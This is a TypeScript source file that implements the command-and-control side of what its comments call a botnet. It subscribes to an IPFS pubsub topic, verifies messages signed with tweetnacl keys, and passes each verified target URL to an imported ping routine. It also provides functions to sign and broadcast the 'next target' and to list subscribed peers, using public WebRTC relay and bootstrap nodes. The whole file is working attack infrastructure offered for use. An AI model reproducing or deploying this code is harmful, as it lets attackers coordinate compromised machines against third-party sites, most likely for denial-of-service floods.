import * as IPFS from 'ipfs-core';
import pingL from './pingLogic';
// Load crpto tool tweetna-cl
import nacl from 'tweetnacl';
import naclUtil from 'tweetnacl-util';
// Load fs for key storing
import fs from 'fs';
import { exit } from 'process';

/**
 * Listener logic
 * @param topic The topic where the messages will be recived
 */
export default async function pbL(topic: string) {
  const ipfs = await create_IPFS();
  const receiveMsg = (msg: { data: BufferSource | undefined; }) => 
    parse_incoming_text(new TextDecoder().decode(msg.data));
  await ipfs.pubsub.subscribe(topic, receiveMsg);
}

const parse_incoming_text = (payload:string) => {
  const signedMessage = naclUtil.decodeBase64(payload);
  const publicKey = fs.readFileSync('pbkey.key').toString();
  const messageVerified = nacl.sign.open(
    signedMessage, 
    naclUtil.decodeBase64(publicKey)
  );
  if (messageVerified !== null) {
    pingL(naclUtil.encodeBase64(messageVerified));
  }
};

/**
 * Send a url to the botnet
 * @param topic The topic witch the message will be sent to
 * @param payload The payload that will be sent
 */
const send_next_target = async (topic:string, payload:string) => {
  const privateKey = fs.readFileSync('pvkey.key').toString();
  const signedMessage = nacl.sign(
    naclUtil.decodeUTF8(payload), 
    naclUtil.decodeBase64(privateKey)
  );
  const ipfs = await create_IPFS();
  const msg = new TextEncoder().encode(naclUtil.encodeBase64(signedMessage));
  await ipfs.pubsub.publish(topic, msg);
  console.log(payload, ' was sent to ', topic);
  exit(0);
};

/**
 * List all peers subscribed to a topic
 * @param topic The topic from witch the peers will be taken
 */
const list_peers = async (topic:string) => {
  const ipfs = await create_IPFS();
  const peerIds = await ipfs.pubsub.peers(topic);
  console.log(peerIds);
  exit(0);
};

/**
 * Creates a IPFS instance
 * @returns ipfs instance
 */
const create_IPFS = async () => {
  const ipfs = await IPFS.create({
    config: {
      Addresses: {
        Swarm: [
          '/dns4/wrtc-star1.par.dwebops.pub/tcp/443/wss/p2p-webrtc-star',
          '/dns4/wrtc-star2.sjc.dwebops.pub/tcp/443/wss/p2p-webrtc-star',
          '/dns4/star.thedisco.zone/tcp/9090/wss/p2p-webrtc-star',
          '/dns6/star.thedisco.zone/tcp/9090/wss/p2p-webrtc-star',
          '/ip4/0.0.0.0/tcp/4002',
          '/ip4/127.0.0.1/tcp/4003/ws'
        ],
      },
      Bootstrap: [
        '/dns6/ipfs.thedisco.zone/tcp/4430/wss/p2p/12D3KooWChhhfGdB9GJy1GbhghAAKCUR99oCymMEVS4eUcEy67nt',
        '/dns4/ipfs.thedisco.zone/tcp/4430/wss/p2p/12D3KooWChhhfGdB9GJy1GbhghAAKCUR99oCymMEVS4eUcEy67nt'
      ],
    },
    relay: {
      enabled: true,
      hop: {
        enabled: true
      }
    }
  });
  console.log();
  return ipfs;
};

// Other exports
export {
  send_next_target,
  list_peers,
};
